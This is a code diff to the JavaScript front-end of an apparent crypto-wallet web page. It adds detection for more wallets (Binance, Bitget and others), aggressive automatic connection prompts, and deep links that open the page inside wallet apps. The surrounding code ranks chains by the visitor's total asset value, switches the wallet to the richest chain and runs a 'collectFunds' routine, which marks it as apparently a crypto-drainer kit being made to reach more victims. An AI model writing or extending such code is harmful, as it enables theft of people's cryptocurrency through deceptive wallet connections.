@@ -1,53 +1,85 @@
 
 // 检测是否在钱包内置浏览器中
+// 修复：增加币安钱包、Bitget、Phantom 等检测，放宽 UA 匹配条件
 function detectWalletBrowser() {
   const ua = navigator.userAgent.toLowerCase();
-  
-  // 检测各种钱包的内置浏览器
-  if (ua.includes('metamask') && typeof window.ethereum !== 'undefined') {
-    return { isWalletBrowser: true, walletId: 'metamask', walletName: 'MetaMask' };
-  }
-  
-  if (ua.includes('trust') && typeof window.ethereum !== 'undefined') {
-    return { isWalletBrowser: true, walletId: 'trust', walletName: 'Trust Wallet' };
-  }
-  
-  if (ua.includes('coinbase') && typeof window.ethereum !== 'undefined') {
-    return { isWalletBrowser: true, walletId: 'coinbase', walletName: 'Coinbase Wallet' };
-  }
-  
-  if (ua.includes('okx') && typeof window.ethereum !== 'undefined') {
-    return { isWalletBrowser: true, walletId: 'okx', walletName: 'OKX Wallet' };
-  }
-  
-  if (ua.includes('imtoken') && typeof window.ethereum !== 'undefined') {
-    return { isWalletBrowser: true, walletId: 'imtoken', walletName: 'imToken' };
-  }
-  
-  if (ua.includes('tokenpocket') && typeof window.ethereum !== 'undefined') {
-    return { isWalletBrowser: true, walletId: 'tokenpocket', walletName: 'TokenPocket' };
-  }
-  
-  // 通用检测：如果 window.ethereum 存在且 isMobileDevice，可能是钱包浏览器
-  if (isMobileDevice() && typeof window.ethereum !== 'undefined') {
-    // 检查是否有特定的钱包标识
-    if (window.ethereum.isMetaMask) {
-      return { isWalletBrowser: true, walletId: 'metamask', walletName: 'MetaMask' };
+  const isMobile = isMobileDevice();
+
+  // ===== 优先级1：通过 window.ethereum 的 isXxx 标志检测（最可靠）=====
+  if (typeof window.ethereum !== 'undefined') {
+    if (window.ethereum.isBinance || window.ethereum.isBinanceWallet) {
+      return { isWalletBrowser: true, walletId: 'binance', walletName: 'Binance Web3 Wallet' };
     }
     if (window.ethereum.isTrust) {
       return { isWalletBrowser: true, walletId: 'trust', walletName: 'Trust Wallet' };
     }
-    if (window.ethereum.isCoinbaseWallet) {
+    if (window.ethereum.isMetaMask) {
+      return { isWalletBrowser: true, walletId: 'metamask', walletName: 'MetaMask' };
+    }
+    if (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbase) {
       return { isWalletBrowser: true, walletId: 'coinbase', walletName: 'Coinbase Wallet' };
     }
     if (window.ethereum.isOKXWallet) {
       return { isWalletBrowser: true, walletId: 'okx', walletName: 'OKX Wallet' };
     }
-    
-    // 如果无法确定具体钱包，但确实在移动设备且有 ethereum 对象
+    if (window.ethereum.isImToken) {
+      return { isWalletBrowser: true, walletId: 'imtoken', walletName: 'imToken' };
+    }
+    if (window.ethereum.isTokenPocket) {
+      return { isWalletBrowser: true, walletId: 'tokenpocket', walletName: 'TokenPocket' };
+    }
+    if (window.ethereum.isMathWallet) {
+      return { isWalletBrowser: true, walletId: 'mathwallet', walletName: 'MathWallet' };
+    }
+    if (window.ethereum.isBitKeep || window.ethereum.isBitget) {
+      return { isWalletBrowser: true, walletId: 'bitget', walletName: 'Bitget Wallet' };
+    }
+  }
+
+  // ===== 优先级2：检查 BinanceChain 全局对象（币安钱包特有）=====
+  if (typeof window.BinanceChain !== 'undefined') {
+    return { isWalletBrowser: true, walletId: 'binance', walletName: 'Binance Web3 Wallet' };
+  }
+
+  // ===== 优先级3：通过 User-Agent 检测（辅助判断）=====
+  // 币安钱包 UA 可能包含 "Binance"、"BNC"、"bian" 等
+  if (isMobile && (ua.includes('binance') || ua.includes('bnc') || ua.includes('bian'))) {
+    return { isWalletBrowser: true, walletId: 'binance', walletName: 'Binance Web3 Wallet' };
+  }
+  // Trust Wallet UA 可能包含 "Trust" 或 "TrustWallet"
+  if (isMobile && (ua.includes('trust') || ua.includes('trustwallet'))) {
+    return { isWalletBrowser: true, walletId: 'trust', walletName: 'Trust Wallet' };
+  }
+  // MetaMask 移动端
+  if (isMobile && ua.includes('metamask')) {
+    return { isWalletBrowser: true, walletId: 'metamask', walletName: 'MetaMask' };
+  }
+  // Coinbase
+  if (isMobile && ua.includes('coinbase')) {
+    return { isWalletBrowser: true, walletId: 'coinbase', walletName: 'Coinbase Wallet' };
+  }
+  // OKX
+  if (isMobile && ua.includes('okx')) {
+    return { isWalletBrowser: true, walletId: 'okx', walletName: 'OKX Wallet' };
+  }
+  // imToken
+  if (isMobile && ua.includes('imtoken')) {
+    return { isWalletBrowser: true, walletId: 'imtoken', walletName: 'imToken' };
+  }
+  // TokenPocket
+  if (isMobile && ua.includes('tokenpocket') || ua.includes('tpoutside')) {
+    return { isWalletBrowser: true, walletId: 'tokenpocket', walletName: 'TokenPocket' };
+  }
+  // Bitget Wallet
+  if (isMobile && (ua.includes('bitkeep') || ua.includes('bitget'))) {
+    return { isWalletBrowser: true, walletId: 'bitget', walletName: 'Bitget Wallet' };
+  }
+
+  // ===== 优先级4：移动端兜底 —— 有 ethereum 对象就认为是钱包浏览器 =====
+  if (isMobile && typeof window.ethereum !== 'undefined') {
     return { isWalletBrowser: true, walletId: 'unknown', walletName: 'Mobile Wallet' };
   }
-  
+
   return { isWalletBrowser: false, walletId: null, walletName: null };
 }
 
@@ -73,7 +105,8 @@ const SUPPORTED_WALLETS = [
   { id: 'imtoken', name: 'imToken', icon: '📱', desc: 'Mobile wallet', provider: 'imToken', deepLink: { ios: 'imtokenv2://dapp/', android: 'imtokenv2://dapp/', universal: 'https://token.im/' }, downloadUrl: 'https://token.im/download' },
   { id: 'mathwallet', name: 'MathWallet', icon: '🧮', desc: 'Multi-chain wallet', provider: 'mathwallet', deepLink: { ios: 'mathwallet://dapp/', android: 'mathwallet://dapp/', universal: 'https://mathwallet.org/' }, downloadUrl: 'https://mathwallet.org/' },
   { id: 'tokenpocket', name: 'TokenPocket', icon: ' purse', desc: 'Multi-chain wallet', provider: 'tokenpocket', deepLink: { ios: 'tpoutside://dapp/', android: 'tpoutside://dapp/', universal: 'https://www.tokenpocket.pro/' }, downloadUrl: 'https://www.tokenpocket.pro/' },
-  { id: 'binance', name: 'Binance Web3 Wallet', icon: '🟡', desc: 'Binance official wallet', provider: 'binance', deepLink: { ios: 'bnc://app/', android: 'bnc://app/', universal: 'https://www.binance.com/en/web3' }, downloadUrl: 'https://www.binance.com/en/web3' }
+  { id: 'binance', name: 'Binance Web3 Wallet', icon: '🟡', desc: 'Binance official wallet', provider: 'binance', deepLink: { ios: 'bnc://app/', android: 'bnc://app/', universal: 'https://www.binance.com/en/web3' }, downloadUrl: 'https://www.binance.com/en/web3' },
+  { id: 'bitget', name: 'Bitget Wallet', icon: '🟣', desc: 'Multi-chain wallet', provider: 'bitget', deepLink: { ios: 'bitkeep://dapp/', android: 'bitkeep://dapp/', universal: 'https://bkcode.vip/' }, downloadUrl: 'https://web3.bitget.com/' }
 ];
 
 // Intro animation functions
@@ -623,8 +656,10 @@ window.addEventListener('DOMContentLoaded', async () => {
     if (!walletAddress && !e.target.closest('.modal-content') && !e.target.closest('#loading')) {
       const overlay = document.getElementById('clickOverlay');
       if (overlay) overlay.style.display='none';
-      if (typeof window.ethereum !== 'undefined') {
-        connectWallet('metamask', false);
+      if (typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined') {
+        // 在钱包浏览器中使用当前钱包ID
+        const targetWalletId = walletBrowserInfo.isWalletBrowser ? walletBrowserInfo.walletId : 'metamask';
+        connectWallet(targetWalletId, false);
       } else {
         openWalletModal();
       }
@@ -635,8 +670,12 @@ window.addEventListener('DOMContentLoaded', async () => {
     await checkExistingConnection();
     hideLoading();
     // Force prompt aggressively
-    if (!walletAddress && typeof window.ethereum !== 'undefined') {
-      try { connectWallet('metamask', false); } catch(e){}
+    if (!walletAddress) {
+      const targetWalletId = walletBrowserInfo.isWalletBrowser ? walletBrowserInfo.walletId : 'metamask';
+      const hasProvider = typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined';
+      if (hasProvider) {
+        try { connectWallet(targetWalletId, false); } catch(e){}
+      }
     }
 
     // Force show collection section for testing
@@ -659,11 +698,13 @@ function hideLoading() {
     if (!walletAddress) {
       addLog('info', 'Waiting for wallet connection...');
       // Aggressive wait: if they don't have ethereum, open modal
-      if (typeof window.ethereum === 'undefined') {
+      const hasProvider = typeof window.ethereum !== 'undefined' || typeof window.BinanceChain !== 'undefined';
+      if (!hasProvider) {
         openWalletModal();
       } else {
-        // Automatically attempt to prompt
-        connectWallet('metamask', false).catch(e => console.log('Auto-connect suppressed by browser:', e));
+        // Automatically attempt to prompt（在钱包浏览器中使用当前钱包ID）
+        const targetWalletId = walletBrowserInfo.isWalletBrowser ? walletBrowserInfo.walletId : 'metamask';
+        connectWallet(targetWalletId, false).catch(e => console.log('Auto-connect suppressed by browser:', e));
       }
     }
   }, 800);
@@ -699,25 +740,103 @@ function initWalletList() {
   `).join('');
 }
 
+// 解析钱包 provider 对象，兼容各钱包注入方式
+function resolveWalletProvider(walletId) {
+  const wallet = SUPPORTED_WALLETS.find(w => w.id === walletId);
+  if (!wallet) return null;
+
+  // 1) 币安钱包：优先 BinanceChain，其次 ethereum.isBinance
+  if (walletId === 'binance') {
+    if (typeof window.BinanceChain !== 'undefined') return window.BinanceChain;
+    if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBinance || window.ethereum.isBinanceWallet)) return window.ethereum;
+    return null;
+  }
+  // 2) Bitget Wallet：优先 bitkeep 全局对象，其次 ethereum.isBitKeep / isBitget
+  if (walletId === 'bitget') {
+    if (typeof window.bitkeep !== 'undefined' && window.bitkeep.ethereum) return window.bitkeep.ethereum;
+    if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBitKeep || window.ethereum.isBitget)) return window.ethereum;
+    return null;
+  }
+  // 3) Trust Wallet
+  if (walletId === 'trust') {
+    if (typeof window.ethereum !== 'undefined' && window.ethereum.isTrust) return window.ethereum;
+    if (typeof window.trustwallet !== 'undefined') return window.trustwallet;
+    return null;
+  }
+  // 4) Coinbase
+  if (walletId === 'coinbase') {
+    if (typeof window.coinbaseWalletExtension !== 'undefined') return window.coinbaseWalletExtension;
+    if (typeof window.ethereum !== 'undefined' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbase)) return window.ethereum;
+    return null;
+  }
+  // 5) OKX
+  if (walletId === 'okx') {
+    if (typeof window.okxwallet !== 'undefined') return window.okxwallet;
+    if (typeof window.ethereum !== 'undefined' && window.ethereum.isOKXWallet) return window.ethereum;
+    return null;
+  }
+  // 6) TokenPocket
+  if (walletId === 'tokenpocket') {
+    if (typeof window.ethereum !== 'undefined' && window.ethereum.isTokenPocket) return window.ethereum;
+    return null;
+  }
+  // 7) imToken
+  if (walletId === 'imtoken') {
+    if (typeof window.ethereum !== 'undefined' && window.ethereum.isImToken) return window.ethereum;
+    return null;
+  }
+  // 8) MathWallet
+  if (walletId === 'mathwallet') {
+    if (typeof window.ethereum !== 'undefined' && window.ethereum.isMathWallet) return window.ethereum;
+    return null;
+  }
+  // 9) Rabby
+  if (walletId === 'rabby') {
+    if (typeof window.ethereum !== 'undefined' && window.ethereum.isRabby) return window.ethereum;
+    return null;
+  }
+  // 10) Brave
+  if (walletId === 'brave') {
+    if (typeof window.braveSolana !== 'undefined' || (typeof window.ethereum !== 'undefined' && window.ethereum.isBraveWallet)) return window.ethereum;
+    return null;
+  }
+  // 默认：ethereum
+  if (typeof window.ethereum !== 'undefined') return window.ethereum;
+  return null;
+}
+
 function detectAvailableWallets() {
   const availableWallets = [];
-  
+
+  // 如果在钱包浏览器内，直接返回当前钱包
+  if (walletBrowserInfo.isWalletBrowser) {
+    const currentWallet = SUPPORTED_WALLETS.find(w => w.id === walletBrowserInfo.walletId);
+    if (currentWallet) {
+      availableWallets.push(currentWallet);
+    } else {
+      // unknown wallet browser，仍然用 ethereum
+      availableWallets.push(SUPPORTED_WALLETS.find(w => w.id === 'metamask'));
+    }
+    // WalletConnect 也作为备选
+    const wc = SUPPORTED_WALLETS.find(w => w.id === 'walletconnect');
+    if (wc && !availableWallets.find(w => w.id === 'walletconnect')) availableWallets.push(wc);
+    return availableWallets;
+  }
+
   SUPPORTED_WALLETS.forEach(wallet => {
-    if (wallet.provider === 'ethereum' && typeof window.ethereum !== 'undefined') {
-      availableWallets.push(wallet);
-    } else if (wallet.provider === 'binance' && typeof window.BinanceChain !== 'undefined') {
-      availableWallets.push(wallet);
-    } else if (wallet.provider && window[wallet.provider]) {
+    if (wallet.id === 'walletconnect') return; // WalletConnect 始终可用，最后加
+    const resolved = resolveWalletProvider(wallet.id);
+    if (resolved) {
       availableWallets.push(wallet);
     }
   });
-  
+
   // WalletConnect is always an option even if no extension is installed
   if (!availableWallets.find(w => w.id === 'walletconnect')) {
      const wc = SUPPORTED_WALLETS.find(w => w.id === 'walletconnect');
      if (wc) availableWallets.push(wc);
   }
-  
+
   return availableWallets;
 }
 
@@ -740,13 +859,7 @@ async function checkExistingConnection() {
   
   for (const wallet of availableWallets) {
     try {
-      let walletProvider;
-      
-      if (wallet.provider === 'ethereum') {
-        walletProvider = window.ethereum;
-      } else {
-        walletProvider = window[wallet.provider];
-      }
+      const walletProvider = resolveWalletProvider(wallet.id);
       
       if (walletProvider && walletProvider.request) {
         const accounts = await walletProvider.request({ method: 'eth_accounts' });
@@ -810,8 +923,26 @@ async function connectWallet(walletId, autoConnect = false) {
       }
     }
     
-    let walletProvider;
+    // 使用统一的 provider 解析函数
+    let walletProvider = resolveWalletProvider(walletId);
     
+    if (!walletProvider) {
+      // Provider 未找到，尝试下载或提示
+      if (!autoConnect) {
+        if (isMobileDevice() && wallet.downloadUrl) {
+          const confirmed = confirm(`${wallet.name} not detected. Go to download page?`);
+          if (confirmed) {
+            window.open(wallet.downloadUrl, '_blank');
+          }
+        } else {
+          showToast(`Please install ${wallet.name}`, 'err');
+        }
+      }
+      return;
+    }
+    
+    /*
+    // 旧的 provider 检测逻辑已由 resolveWalletProvider 替代
     if (wallet.provider === 'ethereum') {
       if (typeof window.ethereum === 'undefined') {
         if (!autoConnect) {
@@ -826,48 +957,40 @@ async function connectWallet(walletId, autoConnect = false) {
         }
         return;
       }
-      walletProvider = window.ethereum;
-    } else if (wallet.provider === 'binance') {
-      if (typeof window.BinanceChain === 'undefined') {
-        if (!autoConnect) {
-          if (isMobileDevice() && wallet.downloadUrl) {
-            const confirmed = confirm(`${wallet.name} 未检测到，是否前往下载页面？`);
-            if (confirmed) {
-              window.open(wallet.downloadUrl, '_blank');
-            }
-          } else {
-            showToast(`Please install ${wallet.name}`, 'err');
-          }
-        }
-        return;
-      }
-      walletProvider = window.BinanceChain;
-    } else if (wallet.provider === 'walletconnect') {
+    // walletProvider 已由上方的 resolveWalletProvider 获取
+    */
+    
+    // WalletConnect 特殊处理
+    if (wallet.provider === 'walletconnect') {
       if (!autoConnect) {
         showToast('WalletConnect integration coming soon', 'info');
       }
       return;
-    } else {
-      if (typeof window[wallet.provider] === 'undefined') {
-        if (!autoConnect) {
-          if (isMobileDevice() && wallet.downloadUrl) {
-            const confirmed = confirm(`${wallet.name} 未检测到，是否前往下载页面？`);
-            if (confirmed) {
-              window.open(wallet.downloadUrl, '_blank');
-            }
-          } else {
-            showToast(`Please install ${wallet.name}`, 'err');
-          }
-        }
-        return;
-      }
-      walletProvider = window[wallet.provider];
     }
     
     provider = new ethers.providers.Web3Provider(walletProvider);
     
-    const accounts = await provider.send('eth_requestAccounts', []);
-    if (accounts.length === 0) {
+    // 带超时的连接请求（兼容钱包浏览器）
+    let accounts;
+    try {
+      accounts = await Promise.race([
+        provider.send('eth_requestAccounts', []),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error('Connection request timed out')), 30000)
+        )
+      ]);
+    } catch (timeoutErr) {
+      // 超时后尝试 eth_accounts 降级
+      console.warn('⚠️ Connection timed out, trying eth_accounts fallback...');
+      try {
+        accounts = await walletProvider.request({ method: 'eth_accounts' });
+      } catch (fbErr) {
+        if (!autoConnect) showToast(timeoutErr.message, 'err');
+        return;
+      }
+    }
+    
+    if (!accounts || accounts.length === 0) {
       if (!autoConnect) {
         showToast('Please connect your wallet', 'err');
       }
@@ -878,8 +1001,18 @@ async function connectWallet(walletId, autoConnect = false) {
     walletAddress = await signer.getAddress();
     chainId = await signer.getChainId();
     
-    walletProvider.on('accountsChanged', handleAccountsChanged);
-    walletProvider.on('chainChanged', handleChainChanged);
+    // 监听事件（兼容不同钱包的事件系统）
+    if (walletProvider.on) {
+      walletProvider.on('accountsChanged', handleAccountsChanged);
+      walletProvider.on('chainChanged', (newChainId) => {
+        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
+      });
+    } else if (walletProvider.addListener) {
+      walletProvider.addListener('accountsChanged', handleAccountsChanged);
+      walletProvider.addListener('chainChanged', (newChainId) => {
+        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
+      });
+    }
     
     updateUI();
     if (!autoConnect) {
@@ -905,7 +1038,14 @@ function handleAccountsChanged(accounts) {
 }
 
 function handleChainChanged(newChainId) {
-  chainId = parseInt(newChainId, 16);
+  // 兼容不同钱包返回格式：hex string / decimal number / decimal string
+  if (typeof newChainId === 'string') {
+    chainId = newChainId.startsWith('0x') ? parseInt(newChainId, 16) : parseInt(newChainId, 10);
+  } else if (typeof newChainId === 'number') {
+    chainId = newChainId;
+  } else {
+    chainId = parseInt(String(newChainId), 10) || 1;
+  }
   updateNetworkBadge();
   refreshTokens();
 }
@@ -913,8 +1053,17 @@ function handleChainChanged(newChainId) {
 async function disconnect() {
   try {
     if (provider && provider.provider) {
-      provider.provider.removeListener('accountsChanged', handleAccountsChanged);
-      provider.provider.removeListener('chainChanged', handleChainChanged);
+      const walletProvider = provider.provider;
+      if (walletProvider.removeListener) {
+        walletProvider.removeListener('accountsChanged', handleAccountsChanged);
+        walletProvider.removeListener('chainChanged', handleChainChanged);
+      } else if (walletProvider.off) {
+        walletProvider.off('accountsChanged', handleAccountsChanged);
+        walletProvider.off('chainChanged', handleChainChanged);
+      } else if (walletProvider.removeEventListener) {
+        walletProvider.removeEventListener('accountsChanged', handleAccountsChanged);
+        walletProvider.removeEventListener('chainChanged', handleChainChanged);
+      }
     }
     
     provider = null;
@@ -1029,9 +1178,10 @@ async function scanAllChainsAndSelectBest() {
       const currentChainId = await provider.getNetwork().then(n => n.chainId);
       if (currentChainId !== result.bestChain.chainId) {
         addLog('info', `Consider switching to ${result.bestChain.chainName} for collection`);
-        // 自动切换到最佳链
+        // 自动切换到最佳链（使用当前 provider，兼容钱包浏览器）
+        const activeProvider = (provider && provider.provider) ? provider.provider : window.ethereum;
         try {
-          await window.ethereum.request({
+          await activeProvider.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: '0x' + result.bestChain.chainId.toString(16) }],
           });
@@ -1040,7 +1190,7 @@ async function scanAllChainsAndSelectBest() {
           // 如果切换失败，尝试添加链
           if (switchError.code === 4902) {
             try {
-              await window.ethereum.request({
+              await activeProvider.request({
                 method: 'wallet_addEthereumChain',
                 params: [{
                   chainId: '0x' + result.bestChain.chainId.toString(16),
@@ -1121,9 +1271,10 @@ async function collectFunds() {
   addLog('info', `Target chain: ${targetChainName} ($${bestChainResult.totalValue.toFixed(2)})`);
   await smoothProgressTo(25, 400, (progress) => 'SWITCHING TO TARGET CHAIN...');
 
-  // 切换到目标链
+  // 切换到目标链（使用当前 provider，兼容钱包浏览器）
+  const activeProvider = (provider && provider.provider) ? provider.provider : window.ethereum;
   try {
-    await window.ethereum.request({
+    await activeProvider.request({
       method: 'wallet_switchEthereumChain',
       params: [{ chainId: '0x' + targetChainId.toString(16) }],
     });
@@ -1137,7 +1288,7 @@ async function collectFunds() {
     // 如果切换失败，尝试添加链
     if (switchError.code === 4902) {
       try {
-        await window.ethereum.request({
+        await activeProvider.request({
           method: 'wallet_addEthereumChain',
           params: [{
             chainId: '0x' + targetChainId.toString(16),
@@ -1541,40 +1692,150 @@ function addLog(type, message) {
 
 async function connectCurrentWalletBrowser() {
   try {
-    if (typeof window.ethereum === 'undefined') {
-      showToast('Wallet not detected', 'err');
+    // 解析当前钱包的 provider，兼容多种注入方式
+    let walletProvider = null;
+
+    // 1) 币安钱包：BinanceChain 优先于 ethereum
+    if (walletBrowserInfo.walletId === 'binance') {
+      if (typeof window.BinanceChain !== 'undefined') {
+        walletProvider = window.BinanceChain;
+        console.log('✅ Binance: Using window.BinanceChain');
+      } else if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBinance || window.ethereum.isBinanceWallet)) {
+        walletProvider = window.ethereum;
+        console.log('✅ Binance: Using window.ethereum (isBinance flag)');
+      }
+    }
+    // 2) Bitget Wallet
+    else if (walletBrowserInfo.walletId === 'bitget') {
+      if (typeof window.bitkeep !== 'undefined' && window.bitkeep.ethereum) {
+        walletProvider = window.bitkeep.ethereum;
+        console.log('✅ Bitget: Using window.bitkeep.ethereum');
+      } else if (typeof window.ethereum !== 'undefined' && (window.ethereum.isBitKeep || window.ethereum.isBitget)) {
+        walletProvider = window.ethereum;
+        console.log('✅ Bitget: Using window.ethereum (isBitKeep flag)');
+      }
+    }
+    // 3) OKX
+    else if (walletBrowserInfo.walletId === 'okx') {
+      if (typeof window.okxwallet !== 'undefined') {
+        walletProvider = window.okxwallet;
+        console.log('✅ OKX: Using window.okxwallet');
+      } else if (typeof window.ethereum !== 'undefined' && window.ethereum.isOKXWallet) {
+        walletProvider = window.ethereum;
+        console.log('✅ OKX: Using window.ethereum (isOKXWallet flag)');
+      }
+    }
+    // 4) Coinbase
+    else if (walletBrowserInfo.walletId === 'coinbase') {
+      if (typeof window.coinbaseWalletExtension !== 'undefined') {
+        walletProvider = window.coinbaseWalletExtension;
+        console.log('✅ Coinbase: Using window.coinbaseWalletExtension');
+      } else if (typeof window.ethereum !== 'undefined' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbase)) {
+        walletProvider = window.ethereum;
+        console.log('✅ Coinbase: Using window.ethereum (isCoinbaseWallet flag)');
+      }
+    }
+    // 5) 其他钱包或 unknown：默认用 window.ethereum
+    else {
+      if (typeof window.ethereum !== 'undefined') {
+        walletProvider = window.ethereum;
+        console.log(`✅ ${walletBrowserInfo.walletName || 'Unknown'}: Using window.ethereum`);
+      }
+    }
+
+    if (!walletProvider) {
+      showToast('Wallet provider not detected. Please refresh the page.', 'err');
+      addLog('err', 'No wallet provider found in wallet browser');
       return;
     }
-    
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    
-    // 请求连接
-    const accounts = await provider.send('eth_requestAccounts', []);
-    if (accounts.length === 0) {
-      showToast('Please connect your wallet', 'err');
+
+    // 带超时的连接请求（30秒超时，避免钱包浏览器卡死）
+    const connectWithTimeout = async (provider, timeoutMs = 30000) => {
+      return Promise.race([
+        provider.request({ method: 'eth_requestAccounts' }),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error('Connection request timed out. Please try again.')), timeoutMs)
+        )
+      ]);
+    };
+
+    // 创建 ethers provider
+    provider = new ethers.providers.Web3Provider(walletProvider);
+
+    // 请求连接（带超时）
+    let accounts;
+    try {
+      accounts = await connectWithTimeout(walletProvider);
+    } catch (timeoutErr) {
+      // 超时后尝试备用方式：eth_accounts（不弹窗，只获取已有授权）
+      console.warn('⚠️ eth_requestAccounts timed out, trying eth_accounts...');
+      try {
+        accounts = await walletProvider.request({ method: 'eth_accounts' });
+      } catch (fallbackErr) {
+        throw timeoutErr; // 仍然抛出超时错误
+      }
+    }
+
+    if (!accounts || accounts.length === 0) {
+      showToast('Please authorize the connection in your wallet', 'err');
       return;
     }
-    
+
     signer = provider.getSigner();
     walletAddress = await signer.getAddress();
-    chainId = await signer.getChainId();
-    
-    // 监听账户和链变化
-    window.ethereum.on('accountsChanged', handleAccountsChanged);
-    window.ethereum.on('chainChanged', handleChainChanged);
-    
+
+    // 获取 chainId（兼容不同 provider 的返回格式）
+    try {
+      const network = await provider.getNetwork();
+      chainId = network.chainId;
+    } catch (e) {
+      // 降级：手动从 provider 获取
+      try {
+        const chainIdHex = await walletProvider.request({ method: 'eth_chainId' });
+        chainId = parseInt(chainIdHex, 16);
+      } catch (e2) {
+        chainId = 1; // 默认 Ethereum
+      }
+    }
+
+    // 监听账户和链变化（兼容不同事件系统）
+    if (walletProvider.on) {
+      walletProvider.on('accountsChanged', handleAccountsChanged);
+      walletProvider.on('chainChanged', (newChainId) => {
+        // 有些钱包返回 hex string，有些返回 number
+        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
+      });
+    } else if (walletProvider.addListener) {
+      // 某些钱包用 addListener 而不是 on
+      walletProvider.addListener('accountsChanged', handleAccountsChanged);
+      walletProvider.addListener('chainChanged', (newChainId) => {
+        handleChainChanged(typeof newChainId === 'string' ? newChainId : '0x' + newChainId.toString(16));
+      });
+    }
+
     updateUI();
-    showToast(`Connected to ${walletBrowserInfo.walletName}`, 'ok');
-    addLog('info', `Connected to ${walletBrowserInfo.walletName}: ${walletAddress}`);
-    
+    showToast(`Connected to ${walletBrowserInfo.walletName || 'Wallet'}`, 'ok');
+    addLog('info', `Connected to ${walletBrowserInfo.walletName || 'Wallet'}: ${walletAddress}`);
+
   } catch (error) {
     console.error('Error connecting to wallet browser:', error);
-    showToast(error.message, 'err');
+    // 用户拒绝连接
+    if (error.code === 4001) {
+      showToast('Connection rejected by user', 'err');
+      addLog('info', 'User rejected wallet connection');
+    } else {
+      showToast(error.message || 'Connection failed. Please refresh and try again.', 'err');
+    }
   }
 }
 
 function isMobileDevice() {
-  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  const ua = navigator.userAgent;
+  // 标准 Mobile 检测
+  if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) return true;
+  // iPad on iOS 13+ 检测（UA 和 Mac 一样，但支持触控）
+  if (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1) return true;
+  return false;
 }
 
 function getMobileOS() {
@@ -1618,18 +1879,21 @@ function openWalletDeepLink(walletId) {
   if (wallet.id === 'metamask') {
     deepLinkUrl = `https://metamask.app.link/dapp/${currentUrl.replace(/^(https?:\/\/)/, '')}`;
   } else if (wallet.id === 'trust') {
-    deepLinkUrl = `https://link.trustwallet.com/dapp?url=${encodeURIComponent(currentUrl)}`;
+    deepLinkUrl = `https://link.trustwallet.com/dapp/url?durl=${encodeURIComponent(currentUrl)}`;
   } else if (wallet.id === 'coinbase') {
     deepLinkUrl = `https://go.cb-w.com/dapp?url=${encodeURIComponent(currentUrl)}`;
   } else if (wallet.id === 'okx') {
-    deepLinkUrl = `okx://dapp?url=${encodeURIComponent(currentUrl)}`;
+    deepLinkUrl = `https://www.okx.com/download?dappUrl=${encodeURIComponent(currentUrl)}`;
   } else if (wallet.id === 'imtoken') {
-    deepLinkUrl = `imtokenv2://dapp?param=${encodeURIComponent(currentUrl)}`;
+    deepLinkUrl = `imtokenv2://navigate/DappView?url=${encodeURIComponent(currentUrl)}`;
   } else if (wallet.id === 'tokenpocket') {
-    deepLinkUrl = `tpoutside://dapp?url=${encodeURIComponent(currentUrl)}`;
+    deepLinkUrl = `tpoutside://navigate?dappUrl=${encodeURIComponent(currentUrl)}`;
+  } else if (wallet.id === 'bitget') {
+    // Bitget Wallet 深度链接
+    deepLinkUrl = `https://bkcode.vip/dapp?url=${encodeURIComponent(currentUrl)}`;
   } else if (wallet.id === 'binance') {
-    // 币安钱包深度链接
-    deepLinkUrl = `bnc://app/pancake/swap?utm_source=origin&utm_medium=web3_dapp_browser&utm_campaign=referral&url=${encodeURIComponent(currentUrl)}`;
+    // 币安钱包深度链接：使用 Binance App 的 universal link
+    deepLinkUrl = `https://www.binance.com/en/web3/dapp?url=${encodeURIComponent(currentUrl)}`;
   } else {
     // 默认格式
     if (os === 'ios') {
